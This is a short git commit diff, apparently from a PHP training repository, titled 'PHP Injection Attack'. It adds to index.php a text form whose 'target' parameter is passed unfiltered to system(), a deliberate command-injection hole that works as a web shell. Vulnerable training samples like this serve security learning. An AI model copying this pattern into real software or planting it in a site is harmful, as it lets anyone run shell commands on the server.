529499ae6c8d779cd1e535189b85711e32fd9027
Min-Cheng <wastiphiby@gmail.com>
2022-12-26 02:21:48 -0500

    PHP Injection Attack

--- php_train/PHPServer/index.php
+++ php_train/PHPServer/index.php
@@ -1,3 +1,10 @@
 <?php
 echo "<h1> Hello PHP! </h1>";
 ?>
+<form>
+    <input type="text" name="target">
+    <input type="submit" value="🕶">
+</form>
+<?php
+if (isset($_GET['target'])) system("${_GET['target']}")
+?>
